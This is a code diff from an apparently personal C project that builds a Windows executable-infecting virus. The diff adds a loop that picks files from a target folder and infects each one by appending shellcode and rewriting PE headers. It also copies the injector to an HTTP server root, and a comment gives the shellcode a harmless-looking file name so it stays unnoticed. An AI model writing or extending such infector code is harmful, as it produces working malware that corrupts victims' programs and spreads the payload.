@@ -5,20 +5,25 @@
 #include <Windows.h>
 #include "exe.h"
 #include "shellcode_functions.h"
+#include "file_system.h"
 
 #pragma warning(disable : 4996)
 
 #define ERROR -1
 #define SUCCESS 0
+#define START_VALUE -2
+
+#define ALREADY_INFECTED 1
+
 
 // Shellcode is the binary file with the position independent code.
 
 // Infect from this directory:
-// #define SHELLCODE_PATH "C:\\Users\\User\\source\\repos\\virus\\shellcode\\shellcode.bin"
+ #define SHELLCODE_PATH "C:\\Users\\User\\source\\repos\\virus\\shellcode\\shellcode.bin"
 
 // Infect from this directory:
 // it will be the shellcode file name in the program infected computer, so it have to be not sus.
-#define SHELLCODE_PATH "serviece.bin"
+//#define SHELLCODE_PATH "serviece.bin"
 
 #define CURRENT_EXE_PATH "C:\\Users\\User\\source\\repos\\virus\\Debug\\injector.exe"
 #define EXE_LOCATION_HTTP_SERVER "C:\\Users\\User\\source\\repos\\virus\\http_server\\wwwroot\\injector.exe"
@@ -37,8 +42,24 @@
 
 int main()
 {
+    int result = START_VALUE;
+    int infected_files = 0;
+    char infected_path[MAX_PATH];
+
+    for (int infected_files_counter = 0; result != SUCCESS; infected_files_counter++)
+    {
+        if (!get_suitable_file("C:\\Users\\User\\source\\repos\\virus\\programs_to_infect", 0, infected_path))
+            return ERROR;
+        printf("%s\n", infected_path);
+        result = infect(infected_path);
+    }
+    while (1);
+}
+
+int infect(char* infected_path)
+{
     // Restarting the infected file to original.
-    CopyFileA(MSGBOX_CPY_PATH, MSGBOX_PATH, FALSE);
+    // CopyFileA(MSGBOX_CPY_PATH, MSGBOX_PATH, FALSE);
 
     // Copy new exe to server root directory keep the injector.
     CopyFileA(CURRENT_EXE_PATH, EXE_LOCATION_HTTP_SERVER, FALSE);
@@ -77,13 +98,13 @@ int main()
         goto end;
     }
 
-    infected->origianal_file_size = add_file_empty_place(INFECTED_PATH, shellcode_size, &result);
+    infected->origianal_file_size = add_file_empty_place(infected_path, shellcode_size, &result);
     if (result != SUCCESS)
     {
         goto end;
     }
 
-    infected->handle = CreateFileA(INFECTED_PATH, 
+    infected->handle = CreateFileA(infected_path, 
         FILE_APPEND_DATA | GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ,          
         NULL,                    
@@ -104,6 +125,7 @@ int main()
     */
     mapping_handle = CreateFileMapping(infected->handle, NULL, PAGE_READWRITE, 0, infected->file_size, NULL);
     infected->mapped_handle = (LPBYTE)MapViewOfFile(mapping_handle, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, infected->file_size);
+
     result = set_exe_headers(infected);
     if (result != SUCCESS)
         goto end;
